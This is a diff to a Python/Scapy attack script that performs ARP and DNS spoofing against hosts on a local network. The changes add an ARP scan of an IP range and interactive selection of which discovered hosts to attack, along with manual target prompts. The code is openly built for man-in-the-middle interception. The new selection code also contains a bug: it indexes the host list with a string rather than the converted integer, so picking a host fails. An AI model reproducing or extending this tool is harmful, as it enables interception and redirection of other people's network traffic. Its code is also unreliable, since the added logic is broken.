@@ -26,11 +26,21 @@ if __name__ == "__main__":
         ips = raw_input("Enter range of IPs to scan for: (e.g 192.168.56.0/24) ")
         conf.verb = 0
         ans, unans = srp(Ether(dst= "ff:ff:ff:ff:ff:ff")/ARP(pdst = ips), timeout = 2, iface=interface, inter=0.1)
+        counter = 0
+        ipList = []
         for snt, recv in ans:
-            print (recv[ARP].psrc, recv[Ether].src)
+            print ("index: ", counter, "IP: ", recv[ARP].psrc)
+            ipList.append(recv[ARP].psrc)
+            counter += 1
+        index = ""
+        while index != "no":
+            index = raw_input("Enter the index of the ip you want to add to be attack IPs or no if you are done adding IPs. ")
+            if index != "no":
+                intIndex = int(index)
+                hostToAttack.append(ipList[index])
 
     if modeOfAttack == "arp":
-        nextOneAttack = "yes"
+        nextOneAttack = raw_input("Do you want to manually add IP address to the to be attack IPs? Type yes or no ")
         while nextOneAttack == "yes":
             attackIp = raw_input("Please enter ip adress to attack: ")
             nextOneAttack = raw_input("If you want to enter another IP addres to attack type yes, otherwise type no. ")
@@ -38,7 +48,7 @@ if __name__ == "__main__":
         spoofIp = raw_input("Please enter ip adress to spoof: ")
         hostToSpoof = spoofIp
     elif modeOfAttack == "dns":
-        nextOneAttack = "yes"
+        nextOneAttack = raw_input("Do you want to manualy add IP address to the to be attack IPs? Type yes or no ")
         while nextOneAttack == "yes":
             attackIp = raw_input("Please enter ip adress to attack: ")
             nextOneAttack = raw_input("If you want to enter another IP addres to attack type yes, otherwise type no. ")
@@ -51,7 +61,7 @@ if __name__ == "__main__":
             urlNext = raw_input("If you want to enter another URL to DNS spoof type yes, otherwise type no. ")
             hostToAttack.append(newUrl)
     elif modeOfAttack == "all":
-        nextOneAttack = "yes"
+        nextOneAttack = raw_input("Do you want to manually add IP address to the to be attack IPs? Type yes or no ")
         while nextOneAttack == "yes":
             attackIp = raw_input("Please enter ip adress to attack: ")
             nextOneAttack = raw_input("If you want to enter another IP addres to attack type yes, otherwise type no. ")
@@ -69,6 +79,9 @@ if __name__ == "__main__":
         print("Wrong mode of attack provided choose out of: arp, dns or all")
         sys.exit(1)
 
+    if len(hostToAttack) == 0:
+        print("You did not add any IP addresses to attack, exiting...")
+        sys.exit(1)
 
     if modeOfAttack == "arp":
         arpSpoofing = ArpSpoofing(interface)
